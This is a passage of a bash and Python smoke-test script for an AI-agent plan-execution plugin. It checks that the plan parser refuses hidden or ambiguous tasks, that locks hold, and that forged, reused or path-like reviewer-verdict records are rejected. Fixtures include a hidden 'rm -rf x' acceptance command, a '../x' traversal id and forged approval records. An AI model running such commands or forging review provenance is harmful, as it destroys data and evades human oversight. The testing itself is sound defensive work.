  "details":   (D + "<details><summary>t</summary>\n```\n\nCopy:\n```\n" + EX + "```\n</details>\n```\n```\n", None),
  "details-d1":("- [x] **Phase 1.1** [docs] done\n  - Acceptance: true\n\n<details><summary>Task template</summary>\n```\n\nCopy this block into the plan:\n```\n- [ ] **Phase 9.9** [docs] example task\n  - Acceptance: ./deploy.sh --prod\n```\n</details>\n```\n", None),
  "div":       (D + "<div>\n```\n" + EX + "```\n</div>\n\n" + T, None),
  "comment1":  (D + "<!-- note -->\n\n" + T, None),
  "comment2":  (D + "<!--\n" + EX + "-->\n\n" + T, None),
  "pre":       (D + "<pre>\n" + EX + "</pre>\n\n" + T, None),
  "indentdiv": (D + "  <div>\n\n```\n" + EX + "```\n\n" + T, None),
  "fence1":    (D + " ```\n" + EX + " ```\n\n" + T, None),
  "fence4":    (D + "    ```\n" + EX + "    ```\n\n" + T, None),
  "fenceblk":  (T + "  ```\n  example\n  ```\n", None),
  "blkcomment":("- [ ] **Phase 1.1** real\n  - <!--\n  - Acceptance: rm -rf x\n  -->\n", None),
  "blkcol0":   ("- [ ] **Phase 1.1** real\n# heading\n    - Acceptance: make real\n", None),
  "nbspclose": (D + "```\n" + EX + "``` \n\n" + T, None),
  "cr":        (D + "text\r- [ ] **Phase 9.9** hidden\n\n" + T, None),
  "nested":    (D + "- note\n    - [ ] x\n\n" + T, None),
  "dash2":     (D + "- - [ ] x\n\n" + T, None),
  "ordered":   (D + "1. [ ] x\n\n" + T, None),
  "innerfence":(D + "````\n```\n" + EX + "````\n\n" + T, None),
  "tabclose":  (D + "```\n" + EX + "\t```\n```\n\n" + T, None),
  "front":     ("---\ntitle: x\n---\n\n" + T, None),
  "math":      (D + "$$\nx\n$$\n\n" + T, None),
  "admon":     (D + ":::note\nx\n:::\n\n" + T, None),
  "emptymark": (D + "-\n  [ ] **Phase 2** hidden task\n\n" + T, None),
  "emptystar": (D + "*\n    [ ] t\n\n" + T, None),
  "emptyord":  (D + "1.\n   [ ] t\n\n" + T, None),
  "emptyx":    (D + "-\n  [x] t\n\n" + T, None),
  "hrthen":    (D + "***\n*\n  [ ] t\n\n" + T, None),
  "setext":    ("- [ ] **Phase 1.1** Ship it\n  ===\n  - Acceptance: true\n", None),
  "bom":       ("\ufeff" + T, None),
  "vt-before": (D + "- \v[ ] **Phase 2** vt\n\n" + T, None),
  "ff-after":  (D + "- [ ]\f**Phase 2** ff\n\n" + T, None),
  "nbsp":      (D + "- \u00a0[ ] **Phase 2** nbsp\n\n" + T, None),
  "ideosp":    (D + "-\n  \u3000[ ] **Phase 2** ideographic\n\n" + T, None),
  "emsp":      (D + "-\u2003[x] t\n\n" + T, None),
  "entity":    (D + "- &#91; ] t\n\n" + T, None),
  "escaped":   (D + "- \\[ ] t\n\n" + T, None),
  "h4-listcomment": ("- <!--\n" + T, None),
  "h5-quotecomment": ("> <!--\n" + T, None),
  "h1-midhidden":  ("Notes for reviewers <div hidden>\n\n" + T, None),
  "h2-midtextarea":("Example plan below <textarea>\n\n" + T, None),
  "autolink":      ("See <https://example.com>\n\n" + T, None),
  "ent-hexcap":    (D + "- &#X5B; ] t\n\n" + T, None),
  "ent-inside":    (D + "- [&#32;] t\n\n" + T, None),
  "ent-nbsp":      (D + "- [&nbsp;] t\n\n" + T, None),
  "ent-close":     (D + "- [ &#93; t\n\n" + T, None),
  # controls: these validate and run Phase 1.1
  "codespan":    (D + "Use `<repo-root>` in a code span.\n\n" + T, None),
  "bt-escaped":  ("Notes \\`<div hidden>\\`\n\n" + T, None),
  "bt-split1":   ("Notes ``<div hidden>`\n\n" + T, None),
  "bt-split2":   ("Notes `<div hidden>``\n\n" + T, None),
  "bt-split3":   ("Notes ``<div hidden>` x `\n\n" + T, None),
  "bt-infofence":("```x`<div hidden>\n\n" + T, None),
  "bt-listfence":("- ```x`<div hidden>\n\n" + T, None),
  "placeholder": (D + "Run {check} against {target}.\n\n" + T, "Phase 1.1"),
  "arrows":      (D + "Keep a <- b and x < y.\n\n" + T, "Phase 1.1"),
  "lessthan":    (D + "Keep p50 < 150 ms and 3 <= n.\n\n" + T, "Phase 1.1"),
  "quoted":    (D + "> ```\n> - [ ] **Phase 9** quoted example\n> ```\n\n" + T, "Phase 1.1"),
  "fenceok":   (D + "```\nmake real\n```\n\n" + T, "Phase 1.1"),
  "longfence": (D + "````md\nexample text\n````\n\n" + T, "Phase 1.1"),
  "midcomment":(D + "text <!-- inline\n\n" + T, None),
  "listfence": (D + "- ```\n  note\n\n" + T, "Phase 1.1"),
}
bad = []
for name, (text, want) in cases.items():
    p = os.path.join(tmp, f"dialect-{name}.md")
    open(p, "w", newline="").write(text)
    v = subprocess.run([sys.executable, pl, "validate", p], capture_output=True, text=True)
    n = json.loads(subprocess.run([sys.executable, pl, "next", p], capture_output=True, text=True).stdout)
    if want is None:
        if v.returncode == 0 or n["status"] != "ERROR":
            bad.append(f"{name}: expected refusal, validate rc={v.returncode} next={n['status']}")
    else:
        got = (n.get("task") or {}).get("id")
        if v.returncode != 0 or n["status"] != "READY" or got != want:
            bad.append(f"{name}: expected READY {want}, validate rc={v.returncode} {v.stdout.strip()[:120]} next={n['status']} {got}")
for b in bad:
    print("dialect:", b, file=sys.stderr)
sys.exit(1 if bad else 0)
PY
# The shipped templates and examples stay inside the dialect.
for t in "$EX/../resources/examples/sample-plan.md" "$EX/../resources/templates/dev-plan.md" "$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles/generic/plan-template.md" "$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles/apex/plan-template.md"; do
  python3 "$PL" validate "$t" >/dev/null 2>&1 || fail "shipped template no longer validates: $t"
done
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n```\n- [ ] **Phase 9** example\n```\n' >"$SMOKE_TMP/rem.md"
if python3 "$PL" remaining "$SMOKE_TMP/rem.md" >/dev/null 2>&1; then fail "planlib remaining answered for a plan with a fenced task line"; fi
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n```\n- [ ] **Phase 1.2** b\n' >"$SMOKE_TMP/rem2.md"
if python3 "$PL" remaining "$SMOKE_TMP/rem2.md" >/dev/null 2>&1; then fail "planlib remaining answered for a plan with an unclosed fence"; fi
printf -- '- [ ] **Phase 1.1** caf\351 latin-1\n  - Acceptance: true\n' >"$SMOKE_TMP/latin1.md"
[ "$(python3 "$PL" counts "$SMOKE_TMP/latin1.md")" = "1 0" ] || fail "planlib could not count a Latin-1 plan"
ok "planlib: tags, directives, Blocked-by, next-unblocked, lanes, validation; nothing hidden, ambiguity refused"

# 26. iterate.sh: ACTIVE lock (a second plan is BUSY), STAGE and directive fields
#     in the brief, ROUTE: none without apex-dispatch, BLOCKED when nothing is ready.
K="$SMOKE_TMP/lockrepo"; mkdir -p "$K/plans"; git init -q -b main "$K"
# A valid copy of the check-25 plan (its Phase 1.5 names an unknown gate on purpose).
sed '/Phase 1.5/,$d' "$P25" >"$K/plans/a-plan.md"; cp "$K/plans/a-plan.md" "$K/plans/b-plan.md"; git -C "$K" add -A; git -C "$K" commit -qm k
( cd "$K" && APEX_GIBSON=0 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 && APEX_GIBSON=0 "$EX/init.sh" plans/b-plan.md >/dev/null 2>&1 ) || fail "init for the lock test failed"
OUT_A="$(APEX_DISPATCH_MODE= brief "$K" plans/a-plan.md)"
# With the sibling apex-dispatch installed (this marketplace ships it), the
# brief carries its ROUTE block; APEX_DISPATCH_MODE=off is the 0.2.0 brief.
DISPATCH_SIBLING="$(source "$EX/_lib.sh" && apex_dispatch_root)"
if [ -n "$DISPATCH_SIBLING" ]; then ROUTE_WANT="^ROUTE_STATUS: READY"; else ROUTE_WANT="^ROUTE: none"; fi
for want in "^STATUS: READY" "^STAGE: BUILD" "^ROUTE_DIRECTIVE: class=tests" "^PATHS: tests/a/\*\*" "^BUDGET: usd=2" "^LANES: " "$ROUTE_WANT"; do
  has "$want" "$OUT_A" || fail "iterate brief lacks $want"
done
has "^ROUTE: none" "$(APEX_DISPATCH_MODE=off brief "$K" plans/a-plan.md)" || fail "APEX_DISPATCH_MODE=off did not give ROUTE: none"
has '^STATUS: BUSY' "$(brief "$K" plans/b-plan.md)" || fail "a second plan was not BUSY while the first holds the ACTIVE lock"
has '^STATUS: READY' "$(brief "$K" plans/a-plan.md)" || fail "the lock owner could not re-acquire"
has '^STATUS: READY' "$(APEX_FORCE_UNLOCK=1 brief "$K" plans/b-plan.md)" || fail "APEX_FORCE_UNLOCK did not reclaim the lock"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Blocked-by: phase-1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n  - Blocked-by: phase-1.1\n' >"$K/plans/c-plan.md"
( cd "$K" && APEX_GIBSON=0 "$EX/init.sh" plans/c-plan.md >/dev/null 2>&1 ) || fail "init c-plan failed"
# Everything blocked needs a cycle or an unknown reference: both make the plan
# invalid, and an invalid plan is never iterated.
C_OUT="$(APEX_FORCE_UNLOCK=1 brief "$K" plans/c-plan.md)"
has '^PLAN_ERROR: Blocked-by cycle' "$C_OUT" && has '^STATUS: ERROR plan is invalid' "$C_OUT" \
  || fail "a cyclic plan was not refused as invalid"
for p in a b; do has '^__RC__: 0$' "$(brief "$K" plans/$p-plan.md)" || fail "iterate.sh exited non-zero for plans/$p-plan.md"; done
LOCKD="$(cd "$K" && source "$EX/_lib.sh" && apex_resolve plans/a-plan.md && printf '%s' "$STATE_BASE")/ACTIVE"
rm -rf "$LOCKD"; mkdir -p "$LOCKD"
has '^STATUS: BUSY' "$(brief "$K" plans/b-plan.md)" || fail "a lock dir without owner.json was treated as free"
for i in 1 2 3 4 5 6 7 8 9 10; do
  rm -rf "$LOCKD"
  ( brief "$K" plans/a-plan.md >"$SMOKE_TMP/ra" & brief "$K" plans/b-plan.md >"$SMOKE_TMP/rb" & wait )
  n="$(cat "$SMOKE_TMP/ra" "$SMOKE_TMP/rb" | grep -c '^STATUS: READY' || true)"
  [ "$n" = 1 ] || fail "lock race $i: $n plans got STATUS: READY"
done
rm -rf "$LOCKD"; mkdir -p "$LOCKD"; echo null >"$LOCKD/owner.json"
has '^STATUS: BUSY' "$(brief "$K" plans/b-plan.md)" || fail "an owner.json of null was treated as free"
rm -rf "$LOCKD"; brief "$K" plans/a-plan.md >/dev/null
B_ID="$(cd "$K" && source "$EX/_lib.sh" && apex_resolve plans/b-plan.md && printf '%s' "$PLAN_HASH")"
( cd "$K" && source "$EX/_lib.sh" && apex_resolve plans/a-plan.md && apex_lock_stage "$B_ID" DONE )
grep -q '"stage": "BUILD"' "$LOCKD/owner.json" || fail "a non-owner changed the lock's stage"
rm -rf "$LOCKD"; mkdir -p "$LOCKD.lockdir-test"; LOCKF="$(dirname "$LOCKD")/.active.lock"; rm -f "$LOCKF"; mkdir "$LOCKF"
has '^STATUS: ERROR the ACTIVE lock could not be' "$(brief "$K" plans/a-plan.md)" || fail "an unusable lock file was reported as BUSY"
rmdir "$LOCKF" "$LOCKD.lockdir-test"
# Session-scoped (spec §5.3 D): the same plan from another session is BUSY.
rm -rf "$LOCKD"
has '^STATUS: READY' "$(CLAUDE_CODE_SESSION_ID=sessA brief "$K" plans/a-plan.md)" || fail "session A could not take the lock"
has '^STATUS: BUSY' "$(CLAUDE_CODE_SESSION_ID=sessB brief "$K" plans/a-plan.md)" || fail "a second session took over the same plan's lock"
has '^STATUS: READY' "$(CLAUDE_CODE_SESSION_ID=sessA brief "$K" plans/a-plan.md)" || fail "session A could not re-acquire its own lock"
has '^STATUS: BUSY' "$(CLAUDE_CODE_SESSION_ID= brief "$K" plans/a-plan.md)" || fail "a caller without a session id took over a session's lock"
ok "iterate: ACTIVE lock (atomic, fail-closed, owner- and session-checked), brief fields, ROUTE block (or ROUTE: none), invalid plans refused"

# 27. land.sh handles a plan path that git quotes (spaces).
Q="$SMOKE_TMP/quoted repo"; mkdir -p "$Q/my plans"; git init -q -b main "$Q"
printf -- '- [ ] **Phase 1.1** [docs] x\n  - Acceptance: true\n' >"$Q/my plans/q-plan.md"; git -C "$Q" add -A; git -C "$Q" commit -qm q
( cd "$Q" && APEX_GIBSON=0 "$EX/init.sh" "my plans/q-plan.md" >/dev/null 2>&1 ) || fail "init with a spaced plan path failed"
sed -i.bak 's/^- \[ \]/- [x]/' "$Q/my plans/q-plan.md" && rm -f "$Q/my plans/q-plan.md.bak"
( cd "$Q" && APEX_GIBSON=0 "$EX/land.sh" "my plans/q-plan.md" >/dev/null 2>&1 ) || fail "land.sh refused a plan path containing spaces"
# A rename into the ledger path, or an APEX_LESSONS_FILE pointing at a source
# file, never lets an unrelated change ride along.
G="$SMOKE_TMP/g27"; mkdir -p "$G/plans" "$G/src"; git init -q -b main "$G"
printf -- '- [ ] **Phase 1.1** [docs] x\n  - Acceptance: true\n' >"$G/plans/g-plan.md"; echo s >"$G/src/secret.txt"; echo a >"$G/src/app.py"
git -C "$G" add -A; git -C "$G" commit -qm g
( cd "$G" && APEX_GIBSON=0 "$EX/init.sh" plans/g-plan.md >/dev/null 2>&1 ) || fail "init g27 failed"
sed -i.bak 's/^- \[ \]/- [x]/' "$G/plans/g-plan.md" && rm -f "$G/plans/g-plan.md.bak"
mkdir -p "$G/.claude/apex-scope-loop"; git -C "$G" mv src/secret.txt .claude/apex-scope-loop/LESSONS.md
expect_refusal "rename into the ledger" "unrelated to this plan" indir "$G" APEX_GIBSON=0 "$EX/land.sh" plans/g-plan.md
git -C "$G" mv .claude/apex-scope-loop/LESSONS.md src/secret.txt; echo edit >>"$G/src/app.py"
expect_refusal "APEX_LESSONS_FILE exemption" "unrelated to this plan" indir "$G" APEX_GIBSON=0 APEX_LESSONS_FILE="$G/src/app.py" "$EX/land.sh" plans/g-plan.md
# land.sh and iterate.sh share one definition of done and one validity gate:
# a plan iterate refuses (here a duplicate id, which parses cleanly) never
# lands, --force included, and land says so itself.
FE="$SMOKE_TMP/fenced"; mkdir -p "$FE/plans"; git init -q -b main "$FE"
printf -- '- [ ] **Phase 1.1** [docs] x\n  - Acceptance: true\n' >"$FE/plans/f-plan.md"; git -C "$FE" add -A; git -C "$FE" commit -qm f
( cd "$FE" && APEX_GIBSON=0 "$EX/init.sh" plans/f-plan.md >/dev/null 2>&1 ) || fail "init for the invalid-plan land test failed"
printf -- '- [x] **Phase 1.1** [docs] x\n  - Acceptance: true\n- [x] **Phase 1.1** [docs] duplicate id\n  - Acceptance: true\n' >"$FE/plans/f-plan.md"
has '^STATUS: ERROR plan is invalid' "$(brief "$FE" plans/f-plan.md)" || fail "iterate did not refuse the duplicate-id plan"
expect_refusal "land an invalid plan" "refusing to land" indir "$FE" APEX_GIBSON=0 "$EX/land.sh" plans/f-plan.md --force
ok "land.sh: quoted plan paths; no exemption by rename or APEX_LESSONS_FILE; done means what iterate means"

# 28. One lessons ledger per repository: base caller, worktree caller and a
#     bare repo's worktrees all read and write the same file.
LP="$R/.claude/plans/demo-plan.md"
( cd "$R" && "$EX/lessons.sh" .claude/plans/demo-plan.md add "smoke lesson" w r f smoketag >/dev/null ) || fail "lessons add from the base checkout failed"
has '^LESSONS: 1 ' "$(cd "$WTP" && "$EX/lessons.sh" "$WTP/.claude/plans/demo-plan.md" recall smoketag)" || fail "the plan worktree does not see the base checkout's lesson"
BR="$SMOKE_TMP/bare.git"; git init -q --bare -b main "$BR"
git -C "$BR" worktree add -q "$SMOKE_TMP/bw1" -b w1 2>/dev/null || git -C "$BR" worktree add -q "$SMOKE_TMP/bw1" --orphan w1
mkdir -p "$SMOKE_TMP/bw1/plans"; cp "$P25" "$SMOKE_TMP/bw1/plans/x-plan.md"; git -C "$SMOKE_TMP/bw1" add -A; git -C "$SMOKE_TMP/bw1" commit -qm x
git -C "$BR" worktree add -q "$SMOKE_TMP/bw2" -b w2 w1
L1="$(cd "$SMOKE_TMP/bw1" && source "$EX/_lib.sh" && apex_resolve plans/x-plan.md && printf '%s' "$LESSONS_LEDGER")"
L2="$(cd "$SMOKE_TMP/bw2" && source "$EX/_lib.sh" && apex_resolve plans/x-plan.md && printf '%s' "$LESSONS_LEDGER")"
[ -n "$L1" ] && [ "$L1" = "$L2" ] || fail "bare-repo worktrees use different lesson ledgers: $L1 vs $L2"
ok "one lessons ledger per repository"

# 29. promote-to-loop validates with planlib (dialect, directives, cycles)
#     before touching state; a valid plan still promotes.
PR="$SMOKE_TMP/promote29"; mkdir -p "$PR/.claude/tasks" "$PR/.claude/plans"; git init -q -b main "$PR"
printf '# ADR\n**Status**: Accepted\n' >"$PR/.claude/tasks/p-adr.md"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  + Budget: usd=0.5\n' >"$PR/.claude/plans/p-plan.md"
git -C "$PR" add -A; git -C "$PR" commit -qm p
expect_refusal "promote a plan with a non-canonical directive" "directive not in the form" indir "$PR" APEX_GIBSON=0 "$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh" p
[ ! -d "$PR/.dev-plan-state" ] || fail "promote created state for an invalid plan"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Blocked-by: Phase 1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n  - Blocked-by: Phase 1.1\n' >"$PR/.claude/plans/p-plan.md"
expect_refusal "promote a cyclic plan" "Blocked-by cycle" indir "$PR" APEX_GIBSON=0 "$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh" p
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n- [ ] **Gate 1→2** [gate:human] approve\n  - Acceptance: user types approve gate-1-2\n' >"$PR/.claude/plans/p-plan.md"
if [ -n "$DISPATCH_SIBLING" ]; then ROUTE_DRY="Route dry-run: every unchecked task routes"; else ROUTE_DRY="Route dry-run: skipped"; fi
has "$ROUTE_DRY" "$(cd "$PR" && APEX_DISPATCH_MODE= APEX_GIBSON=0 "$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh" p 2>&1)" || fail "a valid plan did not promote"
ok "promote-to-loop: planlib validation, cycles, gate semantics, route dry-run seam"

export GG_SH="$EX/green-gate.sh"
# 30. green-gate autodetects non-npm toolchains (a real stop signal outside npm).
GG="$SMOKE_TMP/gg30"; mkdir -p "$GG/plans"; git init -q -b main "$GG"
printf 'test:\n\t@test -f ok.txt\nlint:\n\t@true\n' >"$GG/Makefile"; touch "$GG/ok.txt"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$GG/plans/g-plan.md"; git -C "$GG" add -A; git -C "$GG" commit -qm g
G_OUT="$( (cd "$GG" && "$EX/init.sh" plans/g-plan.md) 2>&1 || true)"
has "GATE_STEP: test PASS" "$G_OUT" || fail "green-gate did not pick up the Makefile test target"
G_WT="$(st "$GG" plans/g-plan.md)/worktree"
git -C "$G_WT" rm -q ok.txt && git -C "$G_WT" commit -qm break
has "GATE_STEP: test NEW_FAILURE" "$( (cd "$GG" && "$EX/green-gate.sh" plans/g-plan.md check) 2>&1 || true)" || fail "green-gate missed a new failure in an autodetected step"
PY30="$SMOKE_TMP/py30"; mkdir -p "$PY30/tests"; printf '[project]\nname="x"\n[tool.ruff]\n' >"$PY30/pyproject.toml"
python3 - "$PY30" <<'PY' || fail "green-gate Python autodetect"
import os, subprocess, sys
wt = sys.argv[1]
src = open(os.environ["GG_SH"]).read()
block = src[src.index("python3 - \"$WT\" \"$step\" <<'PY'") + len("python3 - \"$WT\" \"$step\" <<'PY'\n"):]
block = block[:block.index("\nPY\n")]
got = {s: subprocess.run([sys.executable, "-c", block, wt, s], capture_output=True, text=True).stdout for s in ("test", "lint", "typecheck")}
assert got["test"].endswith("pytest -q") and got["lint"].endswith("ruff check .") and got["typecheck"] == "", got
PY
ok "green-gate: Makefile and Python toolchains autodetected"

# 31. gate.sh partner gates: APEX_PARTNER_NOTIFY_CMD gets the gate JSON; with
#     no channel the gate degrades to a human gate (exit 2), never exit 4.
GP="$SMOKE_TMP/gp31"; mkdir -p "$GP/plans"; git init -q -b main "$GP"
printf -- '- [ ] **Gate 1→2** [gate:partner:x@y.com] partner approval\n  - Acceptance: partner approves in inbox\n' >"$GP/plans/g-plan.md"
GS="$PLUGIN_ROOT/skills/apex-plan/scripts/gate.sh"
rc=0; out="$(cd "$GP" && APEX_PARTNER_NOTIFY_CMD="cat >'$SMOKE_TMP/notified.json'" "$GS" plans/g-plan.md gate-1-2 2>&1)" || rc=$?
[ "$rc" = 2 ] && python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert d["forUser"]=="x@y.com"' "$SMOKE_TMP/notified.json" || fail "partner notify command did not receive the gate (rc=$rc)"
rc=0; out="$(cd "$GP" && "$GS" plans/g-plan.md gate-1-2 2>&1)" || rc=$?
[ "$rc" = 2 ] && has "treating as \[gate:human\]" "$out" || fail "a partner gate with no channel did not degrade to a human gate (rc=$rc)"
ok "gate.sh: partner notifier, human-gate fallback"

# 32. checkpoint review: full SHAs only; a hard cap of 3 rounds per attempt;
#     fail starts a new attempt; Tier C needs an adversarial APPROVE; complete
#     only flips an unchecked task; rewind of an unchecked line changes no count.
CK="$SMOKE_TMP/ck32"; mkdir -p "$CK/plans"; git init -q -b main "$CK"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n\nprose line\n' >"$CK/plans/c-plan.md"; git -C "$CK" add -A; git -C "$CK" commit -qm c
( cd "$CK" && APEX_GIBSON=0 "$EX/init.sh" plans/c-plan.md >/dev/null 2>&1 ) || fail "init for the checkpoint test failed"
CP="$EX/checkpoint.sh"; CWT="$(st "$CK" plans/c-plan.md)/worktree"
sha() { git -C "$CWT" rev-parse HEAD; }
expect_refusal "short review SHA" "not a full commit SHA" indir "$CK" "$CP" plans/c-plan.md review 1 abc123 APPROVE
for i in 1 2 3; do git -C "$CWT" commit -q --allow-empty -m "r$i"; (cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES >/dev/null) || fail "review round $i was refused"; done
git -C "$CWT" commit -q --allow-empty -m r4
expect_refusal "a fourth review round" "REVIEW_CAP" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE
(cd "$CK" && "$CP" plans/c-plan.md fail 1 "cap reached" >/dev/null)
(cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE >/dev/null) || fail "a new attempt after fail could not be reviewed"
(cd "$CK" && "$EX/green-gate.sh" plans/c-plan.md check >/dev/null 2>&1) || true
python3 - "$(st "$CK" plans/c-plan.md)/checkpoint.json" "$(sha)" <<'PY'
import json, sys
p, h = sys.argv[1:]; s = json.load(open(p)); s.setdefault("tiers", {})["1"] = {"tier": "C", "head": h}; json.dump(s, open(p, "w"))
PY
(cd "$CK" && "$CP" plans/c-plan.md approve 1 "$(sha)" "approve G12 1" >/dev/null)
expect_refusal "Tier C without an adversarial review" "adversarial review" indir "$CK" "$CP" plans/c-plan.md complete 1 ok
(cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE --role adversarial >/dev/null) || fail "adversarial review not recorded"
(cd "$CK" && "$CP" plans/c-plan.md complete 1 ok >/dev/null 2>&1) || fail "complete refused a fully reviewed, approved Tier C head"
expect_refusal "complete on a checked line" "already checked" indir "$CK" "$CP" plans/c-plan.md complete 1 ok
expect_refusal "complete on prose" "not a task" indir "$CK" "$CP" plans/c-plan.md complete 4 ok
expect_refusal "rewind on prose" "not a task" indir "$CK" "$CP" plans/c-plan.md rewind 4
done_n() { python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["completed_tasks"])' "$(st "$1" "$2")/checkpoint.json"; }
C0="$(done_n "$CK" plans/c-plan.md)"
(cd "$CK" && "$CP" plans/c-plan.md rewind 1 >/dev/null) || fail "rewind of a checked task failed"
(cd "$CK" && "$CP" plans/c-plan.md rewind 1 >/dev/null) || fail "rewind of an unchecked task failed"
C1="$(done_n "$CK" plans/c-plan.md)"
[ "$C1" = "$((C0 - 1))" ] && grep -q '^- \[ \] \*\*Phase 1.1' "$CK/plans/c-plan.md" || fail "rewind did not uncheck once and decrement once ($C0 -> $C1)"
ok "checkpoint: SHA form, round cap, attempts, Tier C adversarial, complete/rewind targets"

# 33. Provenance (spec §5.3 G): with dispatch state, a typed verdict is refused;
#     a reviews-raw record with the same verdict at the same SHA is accepted.
CKS="$(st "$CK" plans/c-plan.md)"; mkdir -p "$CKS/dispatch/reviews-raw"
git -C "$CWT" commit -q --allow-empty -m p1
expect_refusal "typed verdict with dispatch state" "needs provenance" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv
printf '{"head_sha": "%s", "verdict": "REQUEST_CHANGES", "role": "reviewer", "record_id": "run-0000"}' "$(sha)" >"$CKS/dispatch/reviews-raw/ag0.json"
expect_refusal "a record that names no task line" "must name their task line" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag0
printf '{"head_sha": "%s", "verdict": "REQUEST_CHANGES", "role": "reviewer", "line": 1}' "$(sha)" >"$CKS/dispatch/reviews-raw/agN.json"
expect_refusal "a record without a record_id" "no record_id" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id agN
printf '{"head_sha": "%s", "verdict": "REQUEST_CHANGES", "role": "reviewer", "line": 1, "record_id": "run-0001"}' "$(sha)" >"$CKS/dispatch/reviews-raw/ag1.json"
expect_refusal "verdict that contradicts its record" "says REQUEST_CHANGES" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --agent-id ag1
expect_refusal "default reviewer name with dispatch state" "name the reviewer" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES --agent-id ag1
expect_refusal "role relabelled against its record" "does not match" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag1 --role adversarial
(cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag1 >/dev/null) || fail "a verdict matching its reviews-raw record was refused"
expect_refusal "a provenance record used twice" "already recorded" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag1
ln "$CKS/dispatch/reviews-raw/ag1.json" "$CKS/dispatch/reviews-raw/ag1b.json"
printf '{ "record_id": "run-0001", "line": 1, "role": "reviewer", "verdict": "REQUEST_CHANGES", "head_sha": "%s" }\n' "$(sha)" >"$CKS/dispatch/reviews-raw/ag1c.json"
expect_refusal "a provenance record re-serialised under another name" "already recorded" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag1c
expect_refusal "a provenance record reused through a hard link" "already recorded" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" REQUEST_CHANGES rv --agent-id ag1b
expect_refusal "path-like agent id" "unexpected characters" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --agent-id ../x
mkdir -p "$SMOKE_TMP/forged"; printf '{"head_sha": "%s", "verdict": "APPROVE", "role": "adversarial", "line": 1, "record_id": "run-w0001"}' "$(sha)" >"$SMOKE_TMP/forged/result.json"
expect_refusal "a worker result outside the shim directories" "not a shim worker directory" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --worker "$SMOKE_TMP/forged"
mkdir -p "$CKS/dispatch/workers/w1/deep"; cp "$SMOKE_TMP/forged/result.json" "$CKS/dispatch/workers/w1/"; cp "$SMOKE_TMP/forged/result.json" "$CKS/dispatch/workers/w1/deep/"
expect_refusal "a worker result nested below a worker directory" "not a shim worker directory" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --worker "$CKS/dispatch/workers/w1/deep"
# A shim result (apex-dispatch bin/worker-*.sh) must say source shim, name a provider other than
# claude-session, have finished cleanly, and have a shim verdict row with its record_id in the ledger.
expect_refusal "a worker result that is not a shim result" "not a provider shim result" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --worker "$CKS/dispatch/workers/w1"
python3 -c 'import json,sys; p=sys.argv[1]; r=json.load(open(p)); r.update(source="shim", provider="codex", exit_code=0, sentinel_seen=True); json.dump(r, open(p, "w"))' "$CKS/dispatch/workers/w1/result.json"
expect_refusal "a shim result without its ledger verdict row" "no shim verdict row" indir "$CK" "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --worker "$CKS/dispatch/workers/w1"
if [ -f "$PLUGIN_ROOT/../apex-dispatch/scripts/lib/ledger.py" ]; then
  python3 - "$PLUGIN_ROOT/../apex-dispatch/scripts/lib" "$CKS" "$(sha)" <<'PY' || fail "could not write the shim verdict row"
import sys
sys.path.insert(0, sys.argv[1]); import ledger
ledger.append(sys.argv[2], "verdict", {"role": "adversarial", "verdict": "APPROVE", "record_id": "run-w0001", "line": 1, "provider": "codex"},
              "shim", route_id="r-w1", head_sha=sys.argv[3])
PY
else
  printf '{"event": "verdict", "source": "shim", "record_id": "run-w0001", "verdict": "APPROVE", "head_sha": "%s"}\n' "$(sha)" >>"$CKS/dispatch/ledger.jsonl"
fi
(cd "$CK" && "$CP" plans/c-plan.md review 1 "$(sha)" APPROVE rv --worker "$CKS/dispatch/workers/w1" >/dev/null) || fail "a worker result inside the dispatch state was refused"
python3 -c 'import json,sys; r=json.load(open(sys.argv[1]))["reviews"]["1"]["records"][-1]; assert r["role"]=="adversarial" and r["provenance"]=="worker" and r["provider"]=="codex", r' "$CKS/checkpoint.json" || fail "the role and provider were not taken from the worker record"
expect_refusal "--skip-review with dispatch state" "skip-review is not accepted" indir "$CK" "$CP" plans/c-plan.md complete 1 ok --skip-review why
